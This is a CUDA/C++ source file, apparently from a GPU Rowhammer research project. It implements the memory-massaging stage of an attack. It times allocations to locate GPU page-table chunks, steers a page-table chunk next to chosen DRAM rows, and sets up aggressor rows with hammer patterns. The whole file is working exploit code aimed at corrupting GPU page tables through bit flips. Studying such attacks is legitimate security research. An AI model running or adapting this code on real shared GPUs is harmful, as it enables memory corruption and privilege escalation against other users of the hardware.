#include <iostream>
#include <cuda.h>
#include <thread>
#include "./sc_firstPTC.cuh"
#include "./sc_allocallmem.cuh"
#include <string>
#include <fstream>
#include <cmath>
#include <numeric>
#include <chrono>
#include <random>
#include <algorithm>
#include <rh_kernels.cuh>
#include <rh_utils.cuh> 
#include <rh_impls.cuh>

uint64_t first_PT_chunk_evict(int argc, char *argv[])
{
    const uint64_t num_alloc = std::stoll(argv[0]);
    const double threshold = std::stod(argv[1]);
    const uint64_t skip = std::stoull(argv[2]);

    char **alloc_ptrs = nullptr;

    if (!alloc_all_mem(num_alloc, threshold, skip, &alloc_ptrs))
    {
        printf("Error: Memory Allocation is wrong\n");
        exit(1);
    }

    char *temp;
    size_t free_byte;
    size_t total_byte;
    auto cuda_status = cudaMemGetInfo(&free_byte, &total_byte);

    if ( cudaSuccess != cuda_status )
    {
        printf("Error: cudaMemGetInfo fails, %s \n", cudaGetErrorString(cuda_status));
        exit(1);
    }

    double maxTimeMS = 0;
    uint64_t max_alloc_chunks = total_byte / ALLOC_SIZE;

    /**
     * 1. First allocation will be a 4KB data Page eviction
     * 2. Second eviction will be the PTC allocation
     * 3. The 512th allocation will be a 4KB data Page eviction
     * 3. Step 2 + 508 (508 PT + 4 PD0s = 2MB) is the next PTC allocation
     */
    uint64_t next_id = max_alloc_chunks;
    for (uint64_t i = 0; i < max_alloc_chunks; i += 1)
    {
        // Create Free Space
        cudaMallocManaged(&temp, ALLOC_SIZE + 4096);

        double currentMS = time_data_access(temp + ALLOC_SIZE, 1);
        std::cout << i << " New PT time: " << currentMS << " ms"<< std::endl;

        if (i < skip || i % 512 == 0)
            continue;

        if (currentMS > threshold && next_id == max_alloc_chunks)
        {
            next_id = i + 508;
            std::cout << "Found First Allocation Time: \033[1;31m" << " " << currentMS << "\033[0m." << std::endl;
            std::cout << "Next Allocation Id: \033[1m" << " " << next_id << "\033[0m." << std::endl;
        }
        else if (currentMS > threshold)
        {
            std::cout << "Expected: id\033[1;32m " << next_id << "\033[0m. Expected id: ";
            next_id == i ? std::cout << "\033[1;32m" : std::cout << "\033[1;31m";
            std::cout << i << "\033[0m." << std::endl;
            return i;
        }
    }
    return 0;
}

bool first_PT_chunk(int argc, char *argv[])
{
    const uint64_t num_alloc_init = std::stoll(argv[0]);
    const uint64_t num_alloc = std::stoll(argv[1]);
    const double threshold = std::stod(argv[2]);
    const uint64_t skip = std::stoull(argv[3]);

    return first_PT_chunk(num_alloc_init, num_alloc, threshold, skip);
}

bool first_PT_chunk(uint64_t num_alloc_init, uint64_t num_alloc, double threshold, uint64_t skip)
{
    char **alloc_ptrs = nullptr;

    if (!alloc_all_mem(num_alloc_init, threshold, skip, &alloc_ptrs))
    {
        printf("Error: Memory Allocation is wrong\n");
        exit(1);
    }

    char *temp;
    for (uint64_t i = 0; i < num_alloc; i += 1)
    {
        for (int j = 0; j < 2 * 1024 * 1024; j += 4 * 1024)
            *(alloc_ptrs[i] + j) = 'a';

        // Create Free Space
        cudaMallocManaged(&temp, 2 * 1024 * 1024);

        auto start = std::chrono::high_resolution_clock::now();
        initialize_memory<<<1,1>>>(temp, 2 * 1024 * 1024);
        cudaDeviceSynchronize();
        auto end = std::chrono::high_resolution_clock::now();

        gpuErrchk(cudaPeekAtLastError());
        std::chrono::duration<double, std::milli> duration_evict = end - start;
        double currentMS = duration_evict.count();
        std::cout << i << " New PT time: " << duration_evict.count() << " ms"<< std::endl;

        // Generate Page Table for 64KB Pages.
        *(temp + 0) = 'a';

        if (i < skip)
            continue;
    }
    return true;
}

bool first_PT_chunk_fill(int argc, char *argv[], char ***first_ptc_ptrs,  char ***agg_ptrs, char** evict_ptr, RowList *agg_row_list, std::vector<uint64_t> *agg_vec)
{
    const uint64_t num_alloc_init = std::stoll(argv[0]);
    const uint64_t num_alloc = std::stoll(argv[1]);
    const uint64_t alloc_id = std::stoll(argv[2]);
    const double threshold = std::stod(argv[3]);
    const uint64_t skip = std::stoull(argv[4]);

    return first_PT_chunk_fill(num_alloc_init, num_alloc, alloc_id, threshold, skip, first_ptc_ptrs, agg_ptrs, evict_ptr, agg_row_list, agg_vec);
}

/* I should return the newly allocated memory, the aggressor pointer. */
bool first_PT_chunk_fill(uint64_t num_alloc_init, uint64_t num_alloc, uint64_t alloc_id, double threshold, uint64_t skip , char ***first_ptc_ptrs,  char ***agg_ptrs, char** evict_ptr, RowList *agg_row_list, std::vector<uint64_t> *agg_vec)
{
    char **alloc_ptrs = nullptr;
    int timein;
    char **before_chunk_ptrs = (char **)malloc((num_alloc) * sizeof(char*));

    if (alloc_id < 110)
    {
        std::cout << "Error: Memory Allocation is wrong" << "\n";
        exit(1);
    }
    if (!alloc_all_mem(num_alloc_init, threshold, skip, &alloc_ptrs))
    {
        std::cout << "Error: Memory Allocation is wrong" << "\n";
        exit(1);
    }

    uint8_t* layout = (uint8_t *)alloc_ptrs[0];

    const uint64_t num_victim = 23;
    const uint64_t step       = 256;
    const uint64_t it         = 46000;
    const uint64_t min_rowId  = 30329 - 94;
    const uint64_t max_rowId  = 30329 + 5;
    const uint64_t row_step   = 4;
    const uint64_t skip_step  = 4;
    const uint64_t size       = 46L * 1024 * 1024 * 1024;
    const uint64_t n          = 8;
    const uint64_t k          = 3;
    const uint64_t delay      = 55;
    const uint64_t period     = 1;
    const uint64_t count_iter = 10;
    const uint64_t num_rows   = 64100;
    const uint64_t vic_pat    = std::stoull("0x55", nullptr, 16);
    const uint64_t agg_pat    = std::stoull("0xAA", nullptr, 16);

    std::ifstream row_set_file("/home/rootuser/gpuhammer-reloaded/gpuhammer/results/row_sets/ROW_SET_A.txt");
    RowList rows = read_row_from_file(row_set_file, layout);
    std::cout << rows.size() << '\n';
    row_set_file.close();

    if ((int64_t)(rows.size() - 2 * num_victim - 1) < 0)
    {
        std::cout << "Error: "
                << "Not enough rows to generate the specified victims." << '\n';
        exit(-1);
    }

    std::cout << "Layout address: " << static_cast<void*>(layout) << '\n';
    std::cout << std::hex;
    std::cout << "Victim pattern: " << vic_pat << '\n';
    std::cout << "Aggressor pattern: " << agg_pat << '\n';
    std::cout << std::dec;

    /* Treat all rows as victim rows */
    std::vector<uint64_t> good_agg;
    std::vector<uint64_t> all_vics(num_rows);
    std::iota(all_vics.begin(), all_vics.end(), 0);
    good_agg = get_aggressors(rows, min_rowId, num_victim + 1, row_step);

    char *temp;
    /**
     * Rational:
     *  Given PTC is pushed down as you allocate more memory, 
     *  we want to to control where it goes we need to:
     *      1. We can allocate memory sequentially until we are 4MB 
     *          away from the desired position.
     *      2. We start allocating from the end, avoiding to take over that space
     *      3. Before the we made num_alloc allocations, we free up the next 4MB
     *          from step 1.
     *      4. The PTC allocation is then triggered on that piece of memory.
     */
    uint64_t first_hammer_page = static_cast<uint64_t>(rows[good_agg[0]][0] - layout) / (2UL * 1024 * 1024);
    uint64_t last_hammer_page = static_cast<uint64_t>(rows[max_rowId - 5][0] - layout) / (2UL * 1024 * 1024);
    uint16_t to_reserve = last_hammer_page - first_hammer_page;
    std::vector<uint8_t*> hammer_pointers;

    for (uint64_t i = 0; i < to_reserve; i++)
    {
        evict_from_device(alloc_ptrs[first_hammer_page + i], ALLOC_SIZE);
        cudaMallocManaged(&temp, ALLOC_SIZE);
        time_data_access(temp, ALLOC_SIZE);
        hammer_pointers.push_back((uint8_t*)temp);
        std::cout << first_hammer_page + i << '\n';
    }

    uint64_t next_id = num_alloc_init;
    for (uint64_t i = 0; i < num_alloc_init; i += 1)
    {
        if (i == next_id)
            evict_from_device(alloc_ptrs[last_hammer_page], ALLOC_SIZE);

        // Create Free Space
        cudaMallocManaged(&temp, ALLOC_SIZE + 4096);

        double currentMS = time_data_access(temp + ALLOC_SIZE, 1);
        std::cout << i << " New PT time: " << currentMS << " ms"<< std::endl;

        before_chunk_ptrs[i] = temp;
        if (i < skip || i % 512 == 0)
            continue;

        if (i == next_id)
            break;
        if (currentMS > threshold && next_id == num_alloc_init)
            next_id = i + 508;
    }

    std::cout << "First PTC Generated " << '\n';
    pause();

    /* Free up CPU memory by releasing the evicted memories */
    cudaFree(alloc_ptrs[0]);
    free(alloc_ptrs);

    for (uint64_t i = 0; i < next_id; i += 1)
        cudaFree(before_chunk_ptrs[i]);
    free(before_chunk_ptrs);

    std::cout << "Prior Mem Freed " << '\n';
    pause();

    std::cout << std::dec;
    if (first_ptc_ptrs)
        *first_ptc_ptrs = (char **)malloc((num_alloc_init - 50 - to_reserve - 4) * sizeof(char*));

    cudaMallocManaged(&temp, 50UL * 2 * 1024 * 1024);
    for (uint64_t i = 0; i < 50; i += 1)
    {
        initialize_memory<<<1,1>>>(temp + i * 2 * 1024 * 1024, 2 * 1024 * 1024);
        cudaDeviceSynchronize();
    }
    if (evict_ptr)
        *evict_ptr = temp;

    char** temp_ptrs = (char **)malloc((250) * sizeof(char*));
    for (uint64_t i = 0; i < 250; i += 1)
    {
        cudaMalloc(&temp, 2 * 1024 * 1024);
        initialize_memory<<<1,1>>>(temp, 2 * 1024 * 1024);
        cudaDeviceSynchronize();
        std::cout << "Iterating Mem: " << (void*) temp << '\n';
        temp_ptrs[i] = temp;
    }
    for (uint64_t i = 0; i < 10000; i += 1)
    {
        // Create Free Space
        cudaMallocManaged (&temp, 2 * 1024 * 1024);
        auto start = std::chrono::high_resolution_clock::now();
        initialize_memory<<<1,1>>>(temp, 2 * 1024 * 1024);
        cudaDeviceSynchronize();
        auto end = std::chrono::high_resolution_clock::now();

        gpuErrchk(cudaPeekAtLastError());
        std::chrono::duration<double, std::milli> duration_evict = end - start;
        double currentMS = duration_evict.count();
        std::cout << i << " New PT time: " << duration_evict.count() << " ms"<< std::endl;

        if (first_ptc_ptrs)
            (*first_ptc_ptrs)[i] = temp;

        // Generate Page Table for 64KB Pages.
        *(temp + 0) = 'a';

        if (i < skip)
            continue;
    }

    for (uint64_t i = 0; i < 250; i += 1)
        cudaFree(temp_ptrs[i]);
    free(temp_ptrs);

    for (uint64_t i = 0; i < num_alloc_init - 50 - to_reserve - 4; i += 1)
        {
            cudaMallocManaged (&temp, 2 * 1024 * 1024);
            auto start = std::chrono::high_resolution_clock::now();
            initialize_memory<<<1,1>>>(temp, 2 * 1024 * 1024);
            cudaDeviceSynchronize();
            auto end = std::chrono::high_resolution_clock::now();

            gpuErrchk(cudaPeekAtLastError());
            std::chrono::duration<double, std::milli> duration_evict = end - start;
            double currentMS = duration_evict.count();
            std::cout << i << " New PT time: " << duration_evict.count() << ' ' << (void*)temp << " ms"<< std::endl;

            if (first_ptc_ptrs)
                (*first_ptc_ptrs)[i] = temp;

            *temp = 'a';

            if (i < skip)
                continue;
        }
    // pause();
    // auto rng = std::default_random_engine {42};
    // for (int j = 0; j < 3; j++)
    // {
    //     std::shuffle(*first_ptc_ptrs, *(first_ptc_ptrs) + num_alloc_init - 50 - to_reserve - 4, rng);
    //     for (int i = 0; i < num_alloc_init - 50 - to_reserve - 4; i++)
    //         cudaFree((*first_ptc_ptrs)[i]);
    //     for (uint64_t i = 0; i < num_alloc_init - 50 - to_reserve - 4; i += 1)
    //     {
    //         cudaMallocManaged (&temp, 2 * 1024 * 1024);
    //         auto start = std::chrono::high_resolution_clock::now();
    //         initialize_memory<<<1,1>>>(temp, 2 * 1024 * 1024);
    //         cudaDeviceSynchronize();
    //         auto end = std::chrono::high_resolution_clock::now();

    //         gpuErrchk(cudaPeekAtLastError());
    //         std::chrono::duration<double, std::milli> duration_evict = end - start;
    //         double currentMS = duration_evict.count();
    //         std::cout << i << " New PT time: " << duration_evict.count() << ' ' << (void*)temp << " ms"<< std::endl;

    //         if (first_ptc_ptrs)
    //             (*first_ptc_ptrs)[i] = temp;

    //         *temp = 'a';

    //         if (i < skip)
    //             continue;
    //     }
    //     pause();
    // }

    std::cout << to_reserve << '\n';
    std::cout << hammer_pointers.size() << '\n';
    std::cout << "First PTC Filled " << '\n';
    std::cin.clear();
    std::cin.ignore(std::numeric_limits<std::streamsize>::max(), '\n');
    std::cin >> timein;

    auto offset_map = get_relative_aggressor_offset(rows, good_agg, layout);
    auto row_agg_pair = get_aggressor_rows_from_offset(hammer_pointers, offset_map);
    set_rows(row_agg_pair.first, row_agg_pair.second, agg_pat, step);
    cudaDeviceSynchronize();

    *agg_row_list = row_agg_pair.first;
    *agg_vec = row_agg_pair.second;
    if (agg_ptrs)
    {
        *agg_ptrs = (char **)malloc((hammer_pointers.size()) * sizeof(char*));
        for (int i = 0; i < hammer_pointers.size(); i++)
            (*agg_ptrs)[i] = (char *)hammer_pointers[i];
            
    }

    return true;
}
